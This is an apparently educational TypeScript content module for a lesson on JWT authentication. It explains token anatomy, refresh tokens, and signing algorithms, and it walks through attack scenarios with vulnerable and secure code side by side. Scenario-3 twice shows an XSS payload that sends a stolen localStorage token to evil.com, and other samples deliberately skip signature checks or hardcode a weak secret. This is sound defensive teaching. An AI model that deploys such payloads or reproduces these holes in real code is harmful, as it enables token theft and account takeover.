/**
 * JWT Authentication Lesson Content
 * Theme: DIGITAL SIGNATURE PROTOCOL - Cyberpunk 2084
 */

export const jwtAuthContent = {
  storyHook: {
    title: "DIGITAL SIGNATURE PROTOCOL",
    subtitle: "JWT Authentication",
    clearanceLevel: "Advanced Access",
    status: "ACTIVE",
    narrative: `In the dystopian megacity of 2084, traveling between corporate zones requires a digital passport.
Unlike keycards that must be validated at every checkpoint, this passport is self-contained - it carries your
identity, permissions, and cryptographic proof all in one package. Guards verify the signature instantly without
contacting HQ. This is JWT: a stateless authentication protocol where the token IS the session. Forge it? The
signature breaks. Tamper with claims? Validation fails. But lose it? There's no "deactivate" button until expiration.`,
  },

  sections: [
    // ESSENTIAL SECTIONS
    {
      id: 'section-1',
      category: 'essential',
      title: 'The Digital Passport: What is JWT?',
      icon: 'FileText',
      content: `JSON Web Token (JWT) is a compact, URL-safe means of representing claims to be transferred between
two parties. Unlike session cookies that store just an ID, JWT contains the actual data - user identity, permissions,
expiration - all cryptographically signed.

Think of it as a digital passport: when you cross borders, guards don't call your home country to verify you're real.
They check the passport's holographic seal (signature) and stamps (claims). If the seal is intact and stamps are valid,
you pass through. JWT works the same way - the server signs the token, clients store it, and any server with the secret
key can validate it instantly.

**Key Difference from Sessions:**
- Session: Server stores data, cookie stores ID (stateful)
- JWT: Token stores data, server just validates signature (stateless)

This makes JWT perfect for distributed systems, microservices, and mobile apps where maintaining server-side state
becomes a bottleneck. No database lookup needed - just verify the signature and read the claims.`,
      keyPoints: [
        'Self-contained: Token carries all user data and permissions',
        'Stateless: No server-side storage, just signature validation',
        'Cryptographically signed: Tampering breaks the signature',
        'URL-safe: Can be sent in headers, query params, or POST bodies',
        'Portable: Any server with the secret key can validate it'
      ],
      visual: 'Comparison diagram: Physical passport ↔ JWT structure',
    },
    {
      id: 'section-2',
      category: 'essential',
      title: 'Token Anatomy: The Three-Part Structure',
      icon: 'Package',
      content: `Every JWT has exactly three parts separated by dots (.). Each part serves a specific purpose in the
authentication dance. Understanding this structure is critical for implementing JWT correctly.

**Part 1: Header (Algorithm & Token Type)**
Base64-encoded JSON containing:
- \`alg\`: Signature algorithm (HS256, RS256, etc.)
- \`typ\`: Token type (always "JWT")

**Part 2: Payload (Claims - The Actual Data)**
Base64-encoded JSON containing user data:
- Standard claims: \`sub\` (subject/user ID), \`exp\` (expiration), \`iat\` (issued at)
- Custom claims: \`email\`, \`role\`, \`permissions\`, etc.

**Part 3: Signature (Cryptographic Proof)**
HMAC signature combining header + payload + secret key:
\`HMACSHA256(base64(header) + "." + base64(payload), secret)\`

**Critical Security Note:** Base64 is encoding, NOT encryption. Anyone can decode the payload and read claims.
The signature prevents tampering, not reading. Never put passwords or secrets in JWT payload!`,
      keyPoints: [
        'Header: Specifies signing algorithm (HS256, RS256)',
        'Payload: Contains claims (user data, expiration, etc.)',
        'Signature: Proves token hasn\'t been tampered with',
        'All parts are Base64-encoded (readable by anyone)',
        'Signature = HMAC(header.payload, secret_key)'
      ],
      visual: 'Visual breakdown showing header.payload.signature with color coding',
      codeExamples: {
        javascript: `// JWT Structure Visualization
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTczNTYwMzIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

// Decode (anyone can do this!)
const [header, payload, signature] = token.split('.');

const decodedHeader = JSON.parse(atob(header));
// { "alg": "HS256", "typ": "JWT" }

const decodedPayload = JSON.parse(atob(payload));
// {
//   "sub": "12345",
//   "email": "user@example.com",
//   "role": "admin",
//   "exp": 1735603200
// }

// Signature can't be decoded - it's a hash
console.log(signature);
// "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"`,
        python: `# JWT Structure Visualization
import base64
import json

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTczNTYwMzIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'

# Decode (anyone can do this!)
header, payload, signature = token.split('.')

decoded_header = json.loads(base64.b64decode(header + '=='))
# { "alg": "HS256", "typ": "JWT" }

decoded_payload = json.loads(base64.b64decode(payload + '=='))
# {
#   "sub": "12345",
#   "email": "user@example.com",
#   "role": "admin",
#   "exp": 1735603200
# }

# Signature can't be decoded - it's a hash
print(signature)
# "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"`,
        csharp: `// JWT Structure Visualization
using System;
using System.Text;

var token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTczNTYwMzIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

// Decode (anyone can do this!)
var parts = token.Split('.');
var header = parts[0];
var payload = parts[1];
var signature = parts[2];

var decodedHeader = Encoding.UTF8.GetString(Convert.FromBase64String(header));
// { "alg": "HS256", "typ": "JWT" }

var decodedPayload = Encoding.UTF8.GetString(Convert.FromBase64String(payload));
// {
//   "sub": "12345",
//   "email": "user@example.com",
//   "role": "admin",
//   "exp": 1735603200
// }

Console.WriteLine(signature);
// "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"`,
        ruby: `# JWT Structure Visualization
require 'base64'
require 'json'

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTczNTYwMzIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'

# Decode (anyone can do this!)
header, payload, signature = token.split('.')

decoded_header = JSON.parse(Base64.decode64(header))
# { "alg": "HS256", "typ": "JWT" }

decoded_payload = JSON.parse(Base64.decode64(payload))
# {
#   "sub": "12345",
#   "email": "user@example.com",
#   "role": "admin",
#   "exp": 1735603200
# }

puts signature
# "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"`
      }
    },
    {
      id: 'section-3',
      category: 'essential',
      title: 'The Authentication Flow',
      icon: 'Workflow',
      content: `JWT authentication follows a different pattern than sessions. Instead of creating server-side state,
the server issues a signed token and the client stores it. Every subsequent request includes this token for validation.

**Step 1: Login** - User submits credentials
**Step 2: Verify** - Server validates credentials (bcrypt password check)
**Step 3: Generate JWT** - Server creates token with user claims + signature
**Step 4: Return Token** - Server sends JWT to client (usually in response body)
**Step 5: Store Token** - Client stores JWT (memory, sessionStorage, httpOnly cookie)
**Step 6: Send Token** - Client includes JWT in Authorization header: \`Bearer <token>\`
**Step 7: Validate** - Server verifies signature and checks expiration
**Step 8: Grant Access** - If valid, server extracts user data from payload and processes request

**Key Insight:** Notice there's no database lookup in steps 6-8. The server just verifies the signature using
its secret key. This is why JWT is "stateless" - all authentication data lives in the token itself.

**The Trade-off:** Speed and scalability come at a cost. You can't instantly revoke a JWT. If a user logs out,
the token remains valid until expiration. This is why JWTs should have short lifespans (15 minutes) paired with
refresh tokens for longer sessions.`,
      keyPoints: [
        'Client receives JWT after successful login',
        'Token stored client-side (not in database)',
        'Every request includes token in Authorization header',
        'Server validates signature without database lookup',
        'Cannot revoke token before expiration (stateless trade-off)'
      ],
      visual: 'Flow diagram: Login → Generate JWT → Store → Send → Validate → Access',
    },

    // IMPORTANT SECTIONS
    {
      id: 'section-4',
      category: 'important',
      title: 'Refresh Token Pattern: Staying Logged In',
      icon: 'RotateCw',
      content: `Short-lived access tokens (15 minutes) are secure but annoying - users would need to re-login constantly.
Refresh tokens solve this: long-lived tokens (7 days) that can request new access tokens without re-authentication.

**Two-Token System:**
1. **Access Token** (15 min) - Used for API requests, short-lived, stateless
2. **Refresh Token** (7 days) - Used ONLY to get new access tokens, can be revoked

**The Flow:**
1. Login → Receive both access token + refresh token
2. Use access token for API requests
3. Access token expires after 15 minutes
4. Send refresh token to \`/refresh\` endpoint
5. Receive new access token (and optionally new refresh token)
6. Continue using new access token

**Security Benefits:**
- Access tokens are short-lived (minimizes damage if stolen)
- Refresh tokens can be stored server-side and revoked
- Refresh tokens used rarely (harder to intercept)
- Can implement "logout all devices" by revoking all refresh tokens

**Implementation Pattern:**
- Access token in memory (not localStorage - XSS vulnerable)
- Refresh token in httpOnly cookie (secure, can't be accessed by JS)
- Automatic refresh when access token expires
- Refresh token rotation (issue new refresh token on each refresh)`,
      keyPoints: [
        'Access tokens: Short-lived (15 min), stateless, used for requests',
        'Refresh tokens: Long-lived (7 days), can be revoked, used to get new access tokens',
        'Store access token in memory, refresh token in httpOnly cookie',
        'Automatic refresh before access token expires',
        'Refresh token rotation prevents replay attacks'
      ],
      visual: 'Timeline showing access token expiring and being refreshed',
    },
    {
      id: 'section-5',
      category: 'important',
      title: 'Signing Algorithms: HS256 vs RS256',
      icon: 'Lock',
      content: `JWT supports multiple signing algorithms, each with different security properties and use cases.
The two most common are HS256 (symmetric) and RS256 (asymmetric).

**HS256 (HMAC with SHA-256) - Symmetric:**
- Same secret key used for signing AND verification
- Simpler, faster, less overhead
- Problem: Anyone who can verify can also create tokens
- Use case: Single application where auth server and API are the same

**RS256 (RSA with SHA-256) - Asymmetric:**
- Private key for signing, public key for verification
- Auth server keeps private key secret
- API servers only need public key (can't create tokens)
- Use case: Microservices, multiple APIs, third-party verification

**Security Implications:**
- HS256: If secret leaks, attackers can forge tokens
- RS256: Public key exposure is fine (it's meant to be public)
- HS256: All services need the secret (larger attack surface)
- RS256: Only auth server needs private key (smaller attack surface)

**Performance:**
- HS256: ~2-3x faster signature creation/verification
- RS256: Slower but more secure for distributed systems

**Industry Standard:**
- OAuth providers (Google, GitHub): RS256
- Internal microservices: Often RS256
- Simple single-server apps: HS256 is acceptable`,
      keyPoints: [
        'HS256: Symmetric (same key signs & verifies), faster, simpler',
        'RS256: Asymmetric (private signs, public verifies), more secure',
        'HS256 use case: Single application, auth + API together',
        'RS256 use case: Microservices, distributed systems, third-party',
        'Never share HS256 secret, RS256 public key is meant to be public'
      ],
      visual: 'Diagram comparing HS256 (shared secret) vs RS256 (public/private key pair)',
    },
    {
      id: 'section-6',
      category: 'important',
      title: 'JWT vs Session: The Ultimate Showdown',
      icon: 'Swords',
      content: `Choosing between JWT and sessions is one of the most debated topics in web authentication.
Both have strengths and weaknesses. Understanding the trade-offs is critical for making the right choice.

**Scalability:**
- Session: Requires shared state (Redis, sticky sessions, replication)
- JWT: Truly stateless, scales horizontally with zero coordination
- Winner: JWT for distributed systems

**Revocation:**
- Session: Instant - delete from database, user is logged out
- JWT: No revocation until expiration (can workaround with blacklist, but defeats stateless benefit)
- Winner: Session for security-critical applications

**Performance:**
- Session: Database lookup on every request (can be fast with Redis)
- JWT: No lookup, just signature verification (cryptographic overhead)
- Winner: Tie (both can be optimized)

**Mobile Apps:**
- Session: Cookies work poorly in mobile environments
- JWT: Perfect - just an HTTP header, works anywhere
- Winner: JWT for mobile/native apps

**Security:**
- Session: Server controls everything, can expire/revoke anytime
- JWT: Client holds token, vulnerable if secret key leaks
- Winner: Session for maximum control

**The Hybrid Approach:**
Many apps use both: sessions for web app, JWT for mobile API. Or use JWT for access tokens + server-side refresh tokens.`,
      keyPoints: [
        'Sessions: Better revocation, instant logout, server control',
        'JWT: Better scalability, mobile-friendly, stateless',
        'Sessions require shared storage, JWT requires secret management',
        'Hybrid approach: Sessions for web, JWT for mobile',
        'No universal winner - choose based on your requirements'
      ],
      visual: 'Comparison table: Session vs JWT across 10 criteria',
    },

    // ADVANCED SECTIONS
    {
      id: 'section-7',
      category: 'advanced',
      title: 'Security Vulnerabilities & Attacks',
      icon: 'ShieldAlert',
      content: `JWT is powerful but not bulletproof. Several critical vulnerabilities have plagued real-world implementations.
Understanding these attacks is essential for secure JWT usage.

**Attack 1: Algorithm Confusion (alg: none)**
Attacker changes \`"alg": "HS256"\` to \`"alg": "none"\`, removes signature. Poorly coded servers accept it.

**Attack 2: Secret Key Brute-Force**
Weak secrets (< 32 chars) can be cracked offline. Attacker downloads token, tries millions of keys.

**Attack 3: Token Theft (XSS/Man-in-the-Middle)**
If stored in localStorage, XSS can steal it. If sent over HTTP, network sniffing intercepts it.

**Attack 4: Confused Deputy (Key Confusion)**
Server configured for HS256 but attacker sends RS256 token with public key as "secret". Server validates it!

**Attack 5: Claims Manipulation**
Attacker changes \`"role": "user"\` to \`"role": "admin"\` in payload. If server doesn't verify signature properly, elevation succeeds.

**Attack 6: Expired Token Reuse**
Server forgets to check \`exp\` claim. Expired tokens work forever.

These aren't theoretical - Auth0, Firebase, and major platforms have all patched these vulnerabilities.`,
      keyPoints: [
        'Always verify signature before trusting claims',
        'Never accept "alg: none" tokens',
        'Use strong secrets (min 32 chars random)',
        'Check expiration (exp claim) on every validation',
        'Store tokens securely (httpOnly cookies, not localStorage for web)'
      ],
      visual: 'Security scenario cards (handled by SecurityScenario component)',
    },
    {
      id: 'section-8',
      category: 'advanced',
      title: 'Claims Management & Best Practices',
      icon: 'FileJson',
      content: `JWT claims are the payload data. Choosing what to include - and what to EXCLUDE - is critical
for both security and performance.

**Standard Claims (Registered):**
- \`iss\` (issuer): Who created the token (auth server URL)
- \`sub\` (subject): User identifier (user ID)
- \`aud\` (audience): Who the token is for (API server URL)
- \`exp\` (expiration): Unix timestamp when token expires
- \`iat\` (issued at): Unix timestamp when token was created
- \`nbf\` (not before): Token not valid before this time
- \`jti\` (JWT ID): Unique token identifier (for revocation tracking)

**Custom Claims:**
Add application-specific data:
- \`email\`: User's email address
- \`role\`: User's role (admin, user, guest)
- \`permissions\`: Array of permission strings
- \`tenant_id\`: Multi-tenant identifier

**What NOT to Include:**
- Passwords or password hashes
- Social security numbers or PII
- Credit card information
- Refresh tokens
- Large data sets (keep JWT < 8KB)

**Size Matters:**
Every request includes the JWT. A 50KB token kills performance. Keep it under 1-2KB.

**Security Guidelines:**
- Validate ALL claims (exp, iss, aud) before trusting token
- Use specific audience claims to prevent token misuse
- Include user version/password hash in claims (invalidate on password change)
- Consider using \`jti\` for critical operations (track token usage)`,
      keyPoints: [
        'Always include: sub, exp, iat (minimum viable token)',
        'Consider including: iss, aud for security, role/permissions for authorization',
        'Never include: passwords, secrets, sensitive PII, large data',
        'Keep tokens small (under 2KB) - they\'re sent with every request',
        'Validate ALL claims, not just signature'
      ],
      visual: 'Claims diagram showing standard vs custom vs forbidden claims',
    },
    {
      id: 'section-9',
      category: 'advanced',
      title: 'Production Deployment Checklist',
      icon: 'Rocket',
      content: `Deploying JWT to production? This checklist covers the critical security and operational concerns
that separate hobbyist implementations from enterprise-grade systems.

**Secret Key Management:**
- [ ] Generate cryptographically random secret (min 32 bytes)
- [ ] Store in environment variables, never commit to code
- [ ] Use key management service (AWS KMS, HashiCorp Vault) for production
- [ ] Rotate keys periodically (quarterly at minimum)
- [ ] Plan for key rotation without downtime (support multiple valid keys)

**Token Configuration:**
- [ ] Set short expiration (15 minutes for access, 7 days for refresh)
- [ ] Include \`iss\` and \`aud\` claims for multi-service validation
- [ ] Use \`jti\` claim for critical operations (financial transactions)
- [ ] Implement refresh token rotation (new refresh on each use)

**Storage & Transport:**
- [ ] HTTPS only (no JWT over HTTP - ever!)
- [ ] Store access tokens in memory (not localStorage)
- [ ] Store refresh tokens in httpOnly cookies
- [ ] Set secure and sameSite flags on cookies
- [ ] Implement CORS properly for cross-origin requests

**Validation:**
- [ ] Verify signature before reading claims
- [ ] Check expiration (\`exp\`) on every request
- [ ] Validate issuer (\`iss\`) matches expected value
- [ ] Validate audience (\`aud\`) matches your service
- [ ] Reject tokens with \`alg: none\`

**Monitoring & Logging:**
- [ ] Log token creation (user ID, timestamp, IP)
- [ ] Log validation failures (potential attack attempts)
- [ ] Monitor token usage patterns (detect stolen tokens)
- [ ] Alert on unusual activity (geographic anomalies)
- [ ] Track refresh token usage

**Revocation Strategy:**
- [ ] Maintain refresh token database for revocation
- [ ] Implement "logout all devices" feature
- [ ] Consider token blacklist for emergency revocation
- [ ] Plan for user password change (invalidate all tokens)
- [ ] Document token lifecycle management

**Testing:**
- [ ] Test token expiration handling
- [ ] Test signature validation (try forged tokens)
- [ ] Test algorithm confusion attacks
- [ ] Load test with realistic token sizes
- [ ] Penetration test with security team`,
      keyPoints: [
        'Secure secret key management is non-negotiable',
        'Short-lived tokens + refresh pattern for security',
        'HTTPS + httpOnly cookies for web apps',
        'Comprehensive validation (signature, exp, iss, aud)',
        'Monitor, log, and test everything'
      ],
      visual: 'Checklist with expandable sections for each category',
    },
  ],

  securityScenarios: [
    {
      id: 'scenario-1',
      title: 'Algorithm Confusion: The "alg: none" Attack',
      threatLevel: 'HIGH' as const,
      attack: `An attacker intercepts a valid JWT, decodes the header, and changes the algorithm from "HS256" to "none". They then remove the signature part entirely, creating a token like: header.payload. (note the trailing dot with no signature). A poorly implemented server that doesn't properly validate the algorithm might accept this unsigned token as valid.`,
      exploitation: `With no signature verification required, the attacker can now modify any claim in the payload. Change "role": "user" to "role": "admin", and they have instant privilege escalation. They can also change the "sub" (user ID) to impersonate anyone. The server trusts the token because it didn't enforce algorithm validation.`,
      defense: `NEVER accept tokens with "alg": "none". Your validation library should reject these by default, but explicitly check. Always enforce the expected algorithm (HS256, RS256, etc.) and reject any token using a different algorithm. Use well-tested JWT libraries that protect against this by default.`,
      vulnerableCode: {
        language: 'javascript' as const,
        label: 'Vulnerable Code',
        code: `// VULNERABLE - No algorithm enforcement
function verifyToken(token) {
  const [header, payload, signature] = token.split('.');

  const decodedPayload = JSON.parse(atob(payload));

  // DANGER: No signature verification!
  // No algorithm checking!
  return decodedPayload;
}`
      },
      secureCode: {
        language: 'javascript' as const,
        label: 'Secure Code',
        code: `// SECURE - Proper algorithm enforcement
const jwt = require('jsonwebtoken');

function verifyToken(token) {
  try {
    // Verify signature AND enforce algorithm
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'],  // ONLY accept HS256
      // Reject "none" algorithm automatically
    });

    return decoded;
  } catch (error) {
    throw new Error('Invalid token');
  }
}`
      }
    },
    {
      id: 'scenario-2',
      title: 'Secret Brute-Force: Weak Key Attack',
      threatLevel: 'HIGH' as const,
      attack: `An attacker obtains a valid JWT (from network traffic, browser devtools, etc.). Since the payload is Base64-encoded (not encrypted), they can read all claims. They now attempt to brute-force the secret key by trying millions of common passwords and weak keys: "secret", "password123", "qwerty", etc. With a weak secret (<32 chars), this can succeed in minutes.`,
      exploitation: `Once the secret key is discovered, the attacker can create perfectly valid JWTs for any user. They craft tokens with "admin" roles, future expiration dates, or impersonate specific users. These forged tokens are indistinguishable from legitimate ones because they're signed with the real secret.`,
      defense: `Use cryptographically strong secrets (minimum 32 random bytes, preferably 64). Generate with: crypto.randomBytes(64).toString('hex'). Store in environment variables, never hardcode. Use key management services (AWS KMS, HashiCorp Vault) in production. Rotate keys periodically. Consider RS256 (asymmetric) where the signing key never leaves the auth server.`,
      vulnerableCode: {
        language: 'javascript' as const,
        label: 'Vulnerable Code',
        code: `// VULNERABLE - Weak secret key
const jwt = require('jsonwebtoken');

// DANGER: Only 6 characters, easily brute-forced!
const JWT_SECRET = 'secret';

function createToken(userId) {
  return jwt.sign(
    { sub: userId, role: 'user' },
    JWT_SECRET,
    { expiresIn: '15m' }
  );
}`
      },
      secureCode: {
        language: 'javascript' as const,
        label: 'Secure Code',
        code: `// SECURE - Strong cryptographic secret
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Generate strong secret (run once, store in .env)
// const secret = crypto.randomBytes(64).toString('hex');

// Load from environment variable
const JWT_SECRET = process.env.JWT_SECRET;

// Validate secret strength on startup
if (!JWT_SECRET || JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be at least 32 characters');
}

function createToken(userId) {
  return jwt.sign(
    { sub: userId, role: 'user' },
    JWT_SECRET,
    { expiresIn: '15m', algorithm: 'HS256' }
  );
}`
      }
    },
    {
      id: 'scenario-3',
      title: 'XSS Token Theft: localStorage Vulnerability',
      threatLevel: 'MEDIUM' as const,
      attack: `A developer stores the JWT in localStorage for easy access across page reloads. An attacker finds an XSS vulnerability (unvalidated comment field, reflected search query, etc.) and injects: <script>fetch('https://evil.com/steal?token='+localStorage.getItem('token'))</script>. The script executes in the victim's browser context.`,
      exploitation: `The attacker's script reads the JWT from localStorage and sends it to their server. They now have a valid access token that won't expire for 15 minutes (or longer if you used a longer expiration). During this window, they can make API requests as the victim, accessing their data or performing actions on their behalf.`,
      defense: `NEVER store JWTs in localStorage for web apps - it's vulnerable to XSS. Options: (1) Store in memory (React state) - lost on refresh but secure. (2) Store in httpOnly cookies - JavaScript can't access it. (3) Hybrid: Access token in memory, refresh token in httpOnly cookie. Additionally, implement Content Security Policy (CSP) to prevent XSS attacks altogether.`,
      vulnerableCode: {
        language: 'javascript' as const,
        label: 'Vulnerable Code',
        code: `// VULNERABLE - localStorage exposes token to XSS
async function login(username, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
  });

  const { token } = await response.json();

  // DANGER: Any XSS can steal this!
  localStorage.setItem('token', token);
}

// Attacker's XSS payload:
// <script>
//   fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
// </script>`
      },
      secureCode: {
        language: 'javascript' as const,
        label: 'Secure Code',
        code: `// SECURE - httpOnly cookie (server-side)
// Server sets cookie instead of sending in response body
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  const token = jwt.sign({ sub: user.id }, JWT_SECRET);

  // Set as httpOnly cookie - JavaScript can't access it
  res.cookie('token', token, {
    httpOnly: true,      // Blocks document.cookie
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 900000       // 15 minutes
  });

  res.json({ success: true });
});

// Client side - no storage needed!
// Cookie sent automatically with every request`
      }
    }
  ],

  challenges: [
    {
      id: 'challenge-1',
      title: 'Decode the Signature',
      difficulty: 'Easy' as const,
      description: `You've intercepted a JWT token. Decode the header and payload to extract the user's role and expiration time. Then verify if the signature is valid using the provided secret key.`,
      points: 100
    },
    {
      id: 'challenge-2',
      title: 'Build the Token Factory',
      difficulty: 'Medium' as const,
      description: `Implement a complete JWT creation and validation system. Your code must generate tokens with proper claims (sub, exp, iat), sign them securely, and validate incoming tokens with signature verification and expiration checks.`,
      points: 250
    },
    {
      id: 'challenge-3',
      title: 'Break the Defenses',
      difficulty: 'Hard' as const,
      description: `This JWT implementation has FIVE critical vulnerabilities: weak secret, no algorithm validation, no expiration check, localStorage storage, and missing audience validation. Find and fix all five.`,
      points: 500
    }
  ],

  achievements: {
    levels: [
      {
        id: 'protocol-initiate',
        name: 'Protocol Initiate',
        range: [0, 30],
        description: 'You understand JWT structure and basic usage',
        icon: 'FileText',
        color: 'text-blue-400'
      },
      {
        id: 'security-operative',
        name: 'Token Engineer',
        range: [31, 60],
        description: 'You can implement production-ready JWT authentication',
        icon: 'Package',
        color: 'text-neon-400'
      },
      {
        id: 'elite-guardian',
        name: 'Signature Specialist',
        range: [61, 90],
        description: 'You master advanced JWT security and refresh patterns',
        icon: 'ShieldCheck',
        color: 'text-purple-400'
      },
      {
        id: 'master-architect',
        name: 'Stateless Architect',
        range: [91, 100],
        description: 'Complete mastery of JWT authentication systems',
        icon: 'Award',
        color: 'text-yellow-400'
      }
    ],
    calculateProgress: (completedSections: string[], completedChallenges: string[]) => {
      const sectionWeight = 70;
      const challengeWeight = 30;

      const sectionProgress = (completedSections.length / 9) * sectionWeight;
      const challengeProgress = (completedChallenges.length / 3) * challengeWeight;

      return Math.floor(sectionProgress + challengeProgress);
    },
    getLevel: (percentage: number) => {
      if (percentage >= 91) return 'master-architect';
      if (percentage >= 61) return 'elite-guardian';
      if (percentage >= 31) return 'security-operative';
      return 'protocol-initiate';
    }
  },

  crossReferences: {
    session: {
      title: 'Need Instant Revocation? Use Sessions',
      description: `Sessions offer immediate logout and complete server control. If you need to revoke access instantly (banking, admin panels), sessions are better than JWT. You can also use a hybrid: sessions for web, JWT for mobile API.`,
      link: '/session'
    },
    mfa: {
      title: 'Add Maximum Security with MFA',
      description: `Even with JWT, stolen tokens grant full access. Multi-Factor Authentication adds a second verification layer. After JWT validation, require MFA for sensitive operations. Banking apps commonly use JWT + MFA.`,
      link: '/mfa/learn'
    },
    oauth: {
      title: 'Learn OAuth 2.0 Token Management',
      description: `OAuth uses JWT-like access tokens for third-party authorization. When you "Login with Google," you receive an access token that works similar to JWT. Understanding JWT makes OAuth much easier to grasp.`,
      link: '/oauth/learn'
    }
  }
};
